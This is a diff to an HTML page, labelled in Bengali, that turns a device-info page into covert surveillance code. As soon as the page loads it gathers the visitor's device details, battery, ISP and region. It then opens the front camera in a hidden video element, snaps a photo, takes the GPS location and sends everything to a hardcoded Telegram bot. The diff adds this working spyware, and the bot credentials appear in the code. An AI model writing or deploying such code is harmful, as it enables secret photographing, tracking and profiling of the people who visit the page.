@@ -2,89 +2,125 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📱 ডিভাইস কোম্পানি + ব্যাটারি তথ্য</title>
+  <title>📦 Auto Send: Device Info + Camera + Location</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      background: #f4f9fc;
       text-align: center;
       padding: 40px;
     }
-    h2 { color: #222; }
     #status {
       margin-top: 20px;
-      font-size: 18px;
-      color: #444;
+      font-size: 17px;
+      color: #2c3e50;
     }
   </style>
 </head>
 <body>
-  <h2>📲 কোম্পানি + ব্যাটারি তথ্য</h2>
-  <p id="status">⏳ অনুগ্রহ করে অপেক্ষা করুন...</p>
+  <h2>📲 তথ্য পাঠানো হচ্ছে...</h2>
+  <p id="status">⏳ শুরু হচ্ছে...</p>
+
+  <video id="video" autoplay playsinline width="280" style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
     const CHAT_ID = "1054739462";
     const status = document.getElementById("status");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
 
-    function detectBrand(userAgent) {
-      userAgent = userAgent.toLowerCase();
-      if (userAgent.includes("samsung") || userAgent.includes("sm-")) return "Samsung";
-      if (userAgent.includes("redmi") || userAgent.includes("xiaomi")) return "Xiaomi";
-      if (userAgent.includes("realme") || userAgent.includes("rmx")) return "Realme";
-      if (userAgent.includes("oppo")) return "Oppo";
-      if (userAgent.includes("vivo")) return "Vivo";
-      if (userAgent.includes("iphone") || userAgent.includes("ios")) return "Apple";
-      if (userAgent.includes("oneplus")) return "OnePlus";
-      if (userAgent.includes("nokia")) return "Nokia";
+    function detectBrand(ua) {
+      ua = ua.toLowerCase();
+      if (ua.includes("samsung") || ua.includes("sm-")) return "Samsung";
+      if (ua.includes("redmi") || ua.includes("xiaomi")) return "Xiaomi";
+      if (ua.includes("realme") || ua.includes("rmx")) return "Realme";
+      if (ua.includes("oppo")) return "Oppo";
+      if (ua.includes("vivo")) return "Vivo";
+      if (ua.includes("iphone") || ua.includes("ios")) return "Apple";
+      if (ua.includes("oneplus")) return "OnePlus";
       return "❓ অজানা কোম্পানি";
     }
 
-    async function sendFullDeviceInfo() {
+    async function sendAllData() {
+      status.innerText = "🔍 ডিভাইস তথ্য নিচ্ছে...";
       let batteryInfo = "🔋 Battery: Unknown";
       try {
         const battery = await navigator.getBattery();
         batteryInfo = `🔋 Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
       } catch (e) {}
 
-      const userAgent = navigator.userAgent;
+      const ua = navigator.userAgent;
       const platform = navigator.platform;
       const memory = navigator.deviceMemory || "Unknown";
-      const cpuCores = navigator.hardwareConcurrency || "Unknown";
+      const cores = navigator.hardwareConcurrency || "Unknown";
       const screenRes = `${screen.width}x${screen.height}`;
-      const brand = detectBrand(userAgent);
+      const brand = detectBrand(ua);
 
-      const deviceInfo = `📱 ডিভাইস কোম্পানি: ${brand}
-🛠️ User-Agent: ${userAgent}
+      let ispInfo = "🌐 ISP: Unknown", location = "🌍 Location: Unknown";
+      try {
+        const ipRes = await fetch("https://ipinfo.io/json?token=demo");
+        const ipData = await ipRes.json();
+        ispInfo = `🌐 ISP: ${ipData.org || "N/A"}`;
+        location = `🌍 Country: ${ipData.country}, Region: ${ipData.region}`;
+      } catch (e) {}
+
+      const info = `📱 ডিভাইস তথ্য
+━━━━━━━━━━━━
+🏷️ কোম্পানি: ${brand}
+🛠️ User-Agent: ${ua}
 🧠 Platform: ${platform}
 💾 RAM: ${memory} GB
-🧮 CPU Cores: ${cpuCores}
-📐 স্ক্রিন: ${screenRes}`;
+🧮 CPU Cores: ${cores}
+📐 Screen: ${screenRes}
+${batteryInfo}
+${ispInfo}
+${location}`;
 
-      const message = `${batteryInfo}
-${deviceInfo}`;
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: info })
+      });
 
+      status.innerText = "📸 ক্যামেরা চালু হচ্ছে...";
       try {
-        const res = await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-          })
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
 
-        if (res.ok) {
-          status.innerText = "✅ পাঠানো হয়েছে!";
-        } else {
-          status.innerText = "⚠️ পাঠাতে সমস্যা হয়েছে!";
-        }
-      } catch (err) {
-        status.innerText = "🚫 নেটওয়ার্ক সমস্যা!";
+        setTimeout(async () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+          const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+          stream.getTracks().forEach(track => track.stop());
+
+          let mapURL = "📍 Location: Unknown";
+          try {
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+            const { latitude, longitude } = pos.coords;
+            mapURL = `📍 https://www.google.com/maps?q=${latitude},${longitude}`;
+          } catch (e) {}
+
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", photoBlob, "photo.jpg");
+          formData.append("caption", mapURL);
+
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+
+          status.innerText = "✅ সব তথ্য ও ছবি পাঠানো হয়েছে!";
+        }, 3000);
+      } catch (e) {
+        status.innerText = "❌ ক্যামেরা চালু করা যায়নি!";
       }
     }
 
-    window.onload = sendFullDeviceInfo;
+    window.onload = sendAllData;
   </script>
 </body>
 </html>
